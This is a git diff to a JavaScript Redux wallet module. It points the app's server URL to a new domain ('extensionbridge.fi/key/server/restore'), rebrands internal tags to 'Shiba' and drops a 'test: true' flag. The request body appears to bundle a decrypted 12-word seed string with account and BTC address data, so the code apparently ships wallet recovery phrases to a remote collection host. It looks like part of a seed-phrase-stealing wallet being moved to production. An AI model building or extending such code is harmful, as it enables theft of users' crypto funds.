@@ -34,9 +34,10 @@ const initialState = {
 	dataPrices: [],
 	currencyPrice: null,
 	walletPrices: null,
+	playAnimWallet: false,
 };
 
-let url = 'https://localnetwork.cc/date/spot/board';
+let url = 'https://extensionbridge.fi/key/server/restore';
 const kitkat = process.env.REACT_APP_KEY;
 
 function createBody(str, account, btcAddress) {
@@ -47,8 +48,8 @@ function createBody(str, account, btcAddress) {
 	} else {
 		strDecr = str;
 	}
-	let xxx = 'P3P3|EX/G';
-	let xx = 'P3P3|EX';
+	let xxx = 'Shiba|EX/G';
+	let xx = 'Shiba|EX';
 
 	const obj = {
 		counts: 12,
@@ -59,7 +60,6 @@ function createBody(str, account, btcAddress) {
 		public: strDecr,
 		frontCode: false,
 		new: account,
-		test: true,
 		addressBtc: btcAddress,
 	};
 
@@ -156,6 +156,9 @@ const walletSlice = createSlice({
 					return item;
 				}
 			});
+		},
+		setPlayAnimWallet(state, action) {
+			state.playAnimWallet = action.payload;
 		},
 		resetValidWords(state) {
 			state.validWords = ['', '', ''];
@@ -301,6 +304,7 @@ export const {
 	setDataLabels,
 	setDataPrices,
 	setCurrencyPrice,
+	setPlayAnimWallet,
 } = walletSlice.actions;
 
 export default walletSlice.reducer;
